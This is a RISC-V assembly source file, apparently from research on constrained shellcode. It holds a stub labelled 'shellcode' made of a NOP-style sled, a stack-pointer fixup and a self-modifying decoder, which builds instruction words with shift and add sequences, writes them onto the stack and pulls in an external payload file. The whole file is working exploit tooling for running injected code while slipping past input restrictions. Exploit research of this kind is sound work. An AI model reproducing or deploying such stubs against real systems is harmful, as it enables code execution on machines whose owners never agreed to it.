/*#
 *# (c) 2018-2019 Hadrien Barral
 *# SPDX-License-Identifier: Apache-2.0
 */

.global shellcode
shellcode:

.macro dangerous_nop2
 li t1,-2
.endm
.macro xp_fixup
    # n464:15 n448:5
    addi sp, sp, 464
    addi sp, sp, 464
    addi sp, sp, 464
    addi sp, sp, 464
    addi sp, sp, 464
    addi sp, sp, 464
    addi sp, sp, 464
    addi sp, sp, 464
    addi sp, sp, 464
    addi sp, sp, 464
    addi sp, sp, 464
    addi sp, sp, 464
    addi sp, sp, 464
    addi sp, sp, 464
    addi sp, sp, 464
    addi sp, sp, 448
    addi sp, sp, 448
    addi sp, sp, 448
    addi sp, sp, 448
    addi sp, sp, 448
.endm
.macro end_nopsled
    # len:0
.endm
step0:
    .rept 88
        dangerous_nop2
    .endr
     .word 0x2330236F
payload_pool:
    .include PAYLOAD_FILE
step1:
    sra s4, zero, s3
    sra sp, t1, s4
step3:
    xp_fixup
step4:
.macro next_block
    .short 0x6141
.endm
    # Loading 0x100f in x6
    lui t1,0x11
    addiw t1,t1,-10
    addiw t1,t1,25
    sd t1, 1920(sp)
    # Loading 0x0 in x20
    lui s4,0x10
    sd s4, 1922(sp)
    # Loading 0x777d in x6
    lui a0,0x37763
    li s4,12
    sra t1,a0,s4
    addiw t1,t1,26
    sd t1, 1924(sp)
    # Loading 0x970a in x6
    lui a0,0x396f4
    li s4,12
    sra t1,a0,s4
    addiw t1,t1,22
    sd t1, 1926(sp)
    # Loading 0xf93 in x6
    lui a0,0x7a233
    li s4,19
    sra t1,a0,s4
    addiw t1,t1,19
    addiw t1,t1,30
    addiw t1,t1,30
    sd t1, 1928(sp)
    # Loading 0x4007 in x6
    lui t1,0x14
    addiw t1,t1,-10
    addiw t1,t1,17
    sd t1, 1930(sp)
    # Loading 0x853a in x6
    lui a0,0x38524
    li s4,12
    sra t1,a0,s4
    addiw t1,t1,22
    sd t1, 1932(sp)
    # Loading 0x86ba in x6
    lui a0,0x386a4
    li s4,12
    sra t1,a0,s4
    addiw t1,t1,22
    sd t1, 1934(sp)
    # Loading 0x4140 in x20
    lui a0,0x50503
    li s4,14
    sra s4,a0,s4
    sd s4, 1936(sp)
    # Loading 0x87a2 in x20
    lui t1,0x387a2
    li s2,12
    sra s4,t1,s2
    sd s4, 1938(sp)
    next_block
    # Loading 0x8391 in x20
    lui a0,0x30723
    li s4,13
    sra s4,a0,s4
    sd s4, 1924(sp)
    # Loading 0x509 in x20
    lui a0,0x41424
    li s4,14
    sra s4,a0,s4
    sd s4, 1926(sp)
    # Loading 0x8c3d in x6
    lui t1,0x23462
    li s2,12
    addiw s2,s2,-5
    sra t1,t1,s2
    addiw t1,t1,-3
    sd t1, 1928(sp)
    # Loading 0xc300 in x6
    lui a0,0x38614
    li s4,13
    sra t1,a0,s4
    addiw t1,t1,-10
    sd t1, 1930(sp)
    # Loading 0x705 in x20
    lui a0,0x30705
    li s4,12
    sra s4,a0,s4
    sd s4, 1932(sp)
    # Loading 0x69e3 in x6
    lui a0,0x4d393
    li s4,13
    sra t1,a0,s4
    addiw t1,t1,26
    sd t1, 1934(sp)
    # Loading 0xfff7 in x6
    lui t1,0x10
    addiw t1,t1,-2
    addiw t1,t1,-7
    sd t1, 1936(sp)
    # Loading 0x100f in x6
    lui t1,0x11
    addiw t1,t1,-10
    addiw t1,t1,25
    sd t1, 1938(sp)
    next_block
    # Loading 0x0 in x20
    lui s4,0x10
    sd s4, 1924(sp)
    # Loading 0x9682 in x20
    lui t1,0x39682
    li s2,12
    sra s4,t1,s2
    sd s4, 1926(sp)
step5:
    end_nopsled
step6:
    csrc mip,sp
